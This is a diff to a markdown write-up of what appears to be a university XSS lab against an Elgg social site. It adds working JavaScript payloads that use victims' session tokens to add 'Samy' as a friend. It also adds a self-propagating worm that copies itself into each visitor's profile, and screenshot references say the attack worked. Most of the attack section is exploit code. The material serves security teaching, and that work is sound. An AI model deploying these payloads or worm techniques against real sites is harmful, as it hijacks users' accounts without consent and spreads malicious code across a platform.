@@ -68,32 +68,56 @@ Using this information we can construct an AJAX request to add Samy as a friend 
 
 ```javascript
 <script>
+
 var Ajax=null;
-var guid = elgg.session.user['guid'];
-var ts = elgg.security.token__elgg_ts;
+var ts = elgg.security.token.__elgg_ts;
 var token = elgg.security.token.__elgg_token;
-// Construct the header information for the HTTP request
+
+// 42 is Samy's GUID
+var content = "friend=42&__elgg_ts="+ts+"&__elgg_token="+token;
+
 Ajax=new XMLHttpRequest();
-Ajax.open("GET","http://www.xsslabelgg.com/action/friends/add",true);
+Ajax.open("GET","http://www.xsslabelgg.com/action/friends/add?"+content,true);
 Ajax.setRequestHeader("Host","www.xsslabelgg.com");
 Ajax.setRequestHeader("Keep-Alive","300");
 Ajax.setRequestHeader("Connection","keep-alive");
 Ajax.setRequestHeader("Cookie",document.cookie);
 Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
-// Construct the content. The format of the content can be learned
-// from LiveHTTPHeaders.
-var content ="friend=42&__elgg_ts="+ts+"&__elgg_token="+token;
-// Send the HTTP POST request.
-Ajax.send(content);
+Ajax.send(null);
+
 </script>
 ```
 
+![developing_worm](./writeup/images/developing_worm.png)  
+**Figure 6:** Developing worm payload in FireBug.  
 
-OLD SKELETON DOES NOT WORK....
+![samy_worm_embed](./writeup/images/samy_worm_embed.png)  
+**Figure 7:** JavaScript payload to add Samy as a friend when is profile is visited (Worm). 
+
+Now after we visit Samy's profile as Alice, we see that Alice has added him as a friend.  
+
+![alice_samy](./writeup/images/alice_samy.png)  
+**Figure 8:** Alice added Samy as friend by visiting his page with XSS payload.  
+
+
+### Writing a Self-Propagating XSS Worm  
+In order to construct a self propogating worm, we need the JavaScript exploit we developed above to another user's profile. When a user visits Samy's page, we'll edit their profile with the following snippet below. This will make an AJAX POST request to place our malicious JavaScript inside their About Me section. 
+
+```html
+<div id='i_love_sammy'>
+
+</div>
+```
+
+
 ```javascript
 <script>
 var Ajax=null;
-// Construct the header information for the HTTP request
+var guid = elgg.session.user['guid'];
+var name = elgg.session.user['name'];
+var ts = elgg.security.token.__elgg_ts;
+var token = elgg.security.token.__elgg_token;
+
 Ajax=new XMLHttpRequest();
 Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
 Ajax.setRequestHeader("Host","www.xsslabelgg.com");
@@ -101,10 +125,13 @@ Ajax.setRequestHeader("Keep-Alive","300");
 Ajax.setRequestHeader("Connection","keep-alive");
 Ajax.setRequestHeader("Cookie",document.cookie);
 Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
-// Construct the content. The format of the content can be learned
-// from LiveHTTPHeaders.
-var content="name="+elgg.session.user["username"]+"&description=SamyWorm&guid="+elgg.session.user['guid']; // You need to fill in the details.
-// Send the HTTP POST request.
+
+// Get previous payload code from element id
+var getInf3c73d = document.getElementById('i_love_sammy').innerHTML;
+ 
+
+var content="__elgg_ts="+ts+"&__elgg_token="+token+"&description="+getInf3c73d+"&name="+name+"&accesslevel[description=2&guid="+guid;
+
 Ajax.send(content);
 </script>
 ```
